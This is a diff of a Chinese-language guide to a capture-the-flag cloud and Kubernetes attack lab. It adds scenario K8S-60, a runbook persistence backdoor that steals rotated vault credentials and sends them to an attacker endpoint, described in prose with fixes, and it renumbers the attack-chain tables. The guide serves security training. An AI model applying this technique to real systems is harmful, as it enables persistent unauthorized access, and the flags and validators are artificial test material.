+默认服务账号必须最小权限并按函数隔离；禁止平台自动注入过宽身份；
+项目间访问默认拒绝。
+
+[↑ 返回索引](#六k8s私有云场景)
+
+---
+
+<a id="k8s-60"></a>
+
+### K8S-60 · 持久化即服务 → 托管自动化后门
+
+| 字段 | 值 |
+|---|---|
+| ID | K8S-60 |
+| 名称 | Persistence-as-a-Service: Managed Automation Backdoor |
+| 交付方式 | docker |
+| 难度 | L3 |
+| 技术/CVE | N/A (automation-runbook persistence, case #149) |
+| 入口 | `localhost:10642` |
+| 目录 | `scenarios/k8s/persistence-as-a-service` |
+
+**场景概述**
+
+攻击者在私有云托管自动化服务注册恶意 runbook，脚本以平台工作负载身份周期拉取当前凭据。
+即使运营方轮换静态 Secret，runbook 仍会自动取得新凭据并维持访问。
+
+**教材锚点**
+
+- 案例：Cloud attacker persistence techniques in AWS（#149）
+- 平面：控制面（自动化服务）→ 失败边界：检测/持久化
+- 六镜头：MAGIC（托管自动化以服务身份周期运行）；DETECTION（runbook
+  混在正常自动化中难以发现）
+
+**前置知识 / 条件**
+
+- 托管自动化（runbook/定时任务）与托管身份
+- 凭据轮换作为检测/清除手段的局限
+
+**利用步骤**
+
+1. 注册恶意 runbook：脚本内容=拉取当前 vault 凭据 → 调用受保护资源
+   → 把凭据与 flag 外发到攻击者收集端点。
+2. 触发凭据轮换（`POST /rotate`）并同步受保护资源的新密钥。
+3. 等待 runbook 下一轮执行（每 5s）——它自动用新凭据再次读到 flag。
+4. 终端服务 victim-resource 向 flag-vault 出示受保护资源内网地址（密钥轮换校验通过），换成 flag 后回给调用方——明文只在这一步出现。
+
+**Flag**
+
+- 位置：`flag-vault` 容器内的 `/vault/flag`（0600 root，容器进程读入内存后即不落盘）。
+- 交付条件：只有 victim-resource 向 flag-vault 出示「受保护资源内网地址（密钥轮换校验通过）」（校验模式 `network-source`）时才交付；
+  其它容器、容器环境变量、落地文件与日志里都没有明文。
+- 形态：`flag{k8s-60-<16 位十六进制>}`（验收侧运行时生成，宿主不留副本）。
+- 验收：`python3 scripts/validate-cloud-gate.py k8s-60 <flag>`（gate）+
+  `python3 tests/cloud/run.py k8s-60 <flag>`（参考利用）。
+
+**知识维度**
+
+| 规划维度 | 所需知识 |
+|---|---|
+| 环境与访问 | Managed automation, runbooks, credentials, and rotation |
+| 侦察与前置条件 | Runbook persistence behavior and credential-vault access after rotation |
+| 核心漏洞与利用 | Create a persistent automation runbook/backdoor |
+| 权限、横向或影响 | Long-lived access across credential rotation |
+| 验证 | Wait for or invoke the runbook and capture the final flag |
+
+**修复建议**
+
+自动化服务要审计 runbook 的来源与内容；托管身份按用途最小化；
+轮换之外还要监控异常的周期外发行为；runbook 代码应受代码审查
+与签名保护。
+
+[↑ 返回索引](#六k8s私有云场景)
+
+---
+
 <a id="附录-acloud--k8s-相关攻击链"></a>
 
 ## 附录 A：Cloud / K8s 相关攻击链
@@ -5630,40 +5587,40 @@ kubectl exec -n tenant-a attacker -- cat /proc/1/status | grep -E 'Seccomp|Cap'
 
 | 攻击链目录 | 名称 | 步骤（场景） |
 |---|---|---|
-| `ai-serverless-identity` | Model-as-Code to Serverless Platform Identity to Cross-Tenant Admin | `cloud-19` → `cloud-30` → `cloud-21` |
+| `ai-serverless-identity` | Model-as-Code to Serverless Platform Identity to Cross-Tenant Admin | `k8s-49` → `k8s-59` → `k8s-51` |
 | `caps-to-cluster` | CAP_SYS_ADMIN to Full Cluster | `k8s-14` → `k8s-06` → `k8s-08` |
-| `cf-to-scp` | CF Injection to Global S3 to SCP Bypass | `cloud-04` → `cloud-11` → `cloud-10` |
-| `chaosdb-lineage` | Cross-Tenant Notebook to Host-Agent Channel to Control Plane | `cloud-12` → `cloud-17` → `cloud-20` |
-| `ci-to-oidc` | CI/CD Poisoning to OIDC Federation to Cross-Account | `cloud-05` → `cloud-07` → `cloud-08` |
+| `cf-to-scp` | IaC Injection to Global S3 to Tenant Policy Bypass | `k8s-35` → `cloud-01` → `k8s-41` |
+| `chaosdb-lineage` | Cross-Tenant Notebook to Host-Agent Channel to Control Plane | `k8s-42` → `k8s-47` → `k8s-50` |
+| `ci-to-oidc` | CI/CD Poisoning to OIDC Federation to Cross-Project | `k8s-36` → `k8s-38` → `k8s-39` |
 | `container-to-admin` | Container Escape to Cluster Admin | `k8s-06` → `k8s-11` → `k8s-08` |
 | `cri-to-etcd` | CRI Socket to etcd Full Cluster Compromise | `k8s-16` → `k8s-06` → `k8s-08` |
-| `db-to-cross-account` | Managed DB Escape to IMDS to Cross-Account | `cloud-14` → `cloud-01` → `cloud-08` |
-| `db-to-passrole` | Managed DB Escape to Lambda PassRole to Cross-Account | `cloud-14` → `cloud-03` → `cloud-08` |
-| `detection-blindspot` | Quiet Enum to Unlogged Write to Logging Gap to Persistence | `cloud-25` → `cloud-23` → `cloud-24` → `cloud-31` |
+| `db-to-cross-account` | Managed DB Escape to IMDS to Cross-Project | `k8s-44` → `k8s-04` → `k8s-39` |
+| `db-to-passrole` | Managed DB Escape to Serverless PassRole to Cross-Project | `k8s-44` → `k8s-34` → `k8s-39` |
+| `detection-blindspot` | Quiet Enum to Unlogged Write to Logging Gap to Persistence | `k8s-55` → `k8s-53` → `k8s-54` → `k8s-60` |
 | `docker-to-etcd` | Docker Socket to etcd Cluster Compromise | `k8s-17` → `k8s-09` → `k8s-08` |
 | `externalip-to-secrets` | ExternalIP Traffic Hijack to Secret Theft | `k8s-22` → (Credential Discovery from Captured Traffic) → `k8s-13` → `k8s-06` |
-| `gateway-to-deputy` | Shared Egress Bypass to Connector Secrets to Cross-Account | `cloud-28` → `cloud-27` → `cloud-08` |
+| `gateway-to-deputy` | Shared Egress Bypass to Connector Secrets to Cross-Project | `k8s-57` → `k8s-56` → `k8s-39` |
 | `hostpath-to-daemonset` | hostPath to Node Control | `k8s-12` → `k8s-07` → `k8s-16` |
 | `hostpid-to-node` | hostPID to Node Control | `k8s-23` → (Node Final Flag) |
-| `identity-trust` | Invisible Recon to Forged Trust Root to Actor Confusion to Secrets | `cloud-23` → `cloud-09` → `cloud-21` → `cloud-27` |
+| `identity-trust` | Invisible Recon to Forged Trust Root to Actor Confusion to Secrets | `k8s-53` → `k8s-40` → `k8s-51` → `k8s-56` |
 | `ingress-to-etcd` | Inngress RCE to etcd Compromise | `k8s-20` → (ServiceAccount Token Discovery) → `k8s-06` → `k8s-08` |
 | `kubelet-to-pod-access` | Kubelet Anonymous to Cluster Pod Access | `k8s-07` → `k8s-06` → `k8s-07` |
-| `lambda-to-cross-account` | Lambda Injection to Invisible Recon to Cross-Account | `cloud-03` → `cloud-23` → `cloud-08` |
-| `loggap-to-s3-stealth` | Invisible Recon to Invisible Write to S3 Stealth Exfiltration | `cloud-23` → `cloud-24` → `cloud-11` |
-| `managed-data-lateral` | Shared Runtime to Cross-Tenant Workspace to Managed DB to IMDS | `cloud-15` → `cloud-29` → `cloud-14` → `cloud-01` |
-| `managed-db-lateral` | Managed DB Escape to Provider Internal Net to Cross-Tenant DB | `cloud-14` → `cloud-13` → `cloud-16` |
-| `middleware-network` | Cloud Middleware RCE to Shared Egress to Shared Runtime | `cloud-22` → `cloud-28` → `cloud-15` |
-| `notebook-to-scp` | Notebook Escape to Cross-Tenant Notebook to SCP Bypass | `cloud-06` → `cloud-12` → `cloud-10` |
+| `lambda-to-cross-account` | Serverless Injection to Invisible Recon to Cross-Project | `k8s-34` → `k8s-53` → `k8s-39` |
+| `loggap-to-s3-stealth` | Invisible Recon to Invisible Write to S3 Stealth Exfiltration | `k8s-53` → `k8s-54` → `cloud-01` |
+| `managed-data-lateral` | Shared Runtime to Cross-Tenant Workspace to Managed DB to IMDS | `k8s-45` → `k8s-58` → `k8s-44` → `k8s-04` |
+| `managed-db-lateral` | Managed DB Escape to Provider Internal Net to Cross-Tenant DB | `k8s-44` → `k8s-43` → `k8s-46` |
+| `middleware-network` | Cloud Middleware RCE to Shared Egress to Shared Runtime | `k8s-52` → `k8s-57` → `k8s-45` |
+| `notebook-to-scp` | Notebook Escape to Cross-Tenant Notebook to Tenant Policy Bypass | `k8s-37` → `k8s-42` → `k8s-41` |
 | `pg-sqli-to-node` | PostgreSQL SQLi to Node Compromise | `web-07` → `db-01` → `k8s-12` → `k8s-07` |
 | `privilege-to-etcd` | Privilege to etcd | `k8s-11` → `k8s-06` → `k8s-08` |
 | `redis-to-k8s` | Redis to K8s Cluster Admin | `db-05` → `k8s-11` → `k8s-06` → `k8s-08` |
-| `s3-to-cf` | Global S3 to CF Injection to IAM Escalation | `cloud-11` → `cloud-04` → `cloud-08` |
+| `s3-to-cf` | Global S3 to IaC Injection to IAM Escalation | `cloud-01` → `k8s-35` → `k8s-39` |
 | `sa-lateral-escape` | SA Token Lateral to Escape | `k8s-13` → `k8s-06` → `k8s-12` |
-| `ssrf-to-cross-account` | SSRF to IMDS to Cross-Account Takeover | `cloud-01` → `cloud-01` → `cloud-08` → `cloud-08` |
-| `ssrf-to-oidc` | SSRF to IMDS to OIDC to Cross-Account | `cloud-01` → `cloud-01` → `cloud-07` → `cloud-07` → `cloud-08` |
-| `supply-chain-persistence` | Build Fleet Registry to Dependency Confusion to Persistence | `cloud-18` → `cloud-26` → `cloud-31` |
-| `svctag-to-imds-to-deputy` | Shared Egress Bypass to IMDS to Cross-Account | `cloud-28` → `cloud-01` → `cloud-08` |
-| `web-to-db-to-cross-account` | Web RCE to Managed DB Escape to IMDS to Cross-Account | `web-03` → `db-01` → `cloud-14` → `cloud-01` → `cloud-08` |
+| `ssrf-to-cross-account` | SSRF to IMDS to Cross-Project Takeover | `k8s-04` → `k8s-04` → `k8s-39` → `k8s-39` |
+| `ssrf-to-oidc` | SSRF to IMDS to OIDC to Cross-Project | `k8s-04` → `k8s-04` → `k8s-38` → `k8s-38` → `k8s-39` |
+| `supply-chain-persistence` | Build Fleet Registry to Dependency Confusion to Persistence | `k8s-48` → `cloud-02` → `k8s-60` |
+| `svctag-to-imds-to-deputy` | Shared Egress Bypass to IMDS to Cross-Project | `k8s-57` → `k8s-04` → `k8s-39` |
+| `web-to-db-to-cross-account` | Web RCE to Managed DB Escape to IMDS to Cross-Project | `web-03` → `db-01` → `k8s-44` → `k8s-04` → `k8s-39` |
 | `wp-lfi-to-cluster` | WordPress LFI to Cluster Admin | `web-06` → `k8s-06` → `k8s-17` → `k8s-08` |
 
 <a id="附录-b数据来源"></a>
@@ -5673,8 +5630,8 @@ kubectl exec -n tenant-a attacker -- cat /proc/1/status | grep -E 'Seccomp|Cap'
 | 来源 | 说明 |
 |---|---|
 | `cve_challenges/scripts/scenarios.yaml` | 场景注册表：稳定 ID、类型、路径、端口、难度、CVE/技术 |
-| `cve_challenges/scenarios/cloud/*/GUIDE.md` | 31 个云场景的权威说明 |
-| `cve_challenges/scenarios/k8s/*/GUIDE.md` | 31 个 K8s 场景的权威说明 |
+| `cve_challenges/scenarios/cloud/*/GUIDE.md` | 2 个公有云场景的权威说明 |
+| `cve_challenges/scenarios/k8s/*/GUIDE.md` | 60 个私有云场景的权威说明 |
 | `cve_challenges/chains/*/chain.yaml` | 攻击链定义 |
 | `cve_challenges/README.md` / `AGENTS.md` | 部署、Flag 与校验约定 |
 
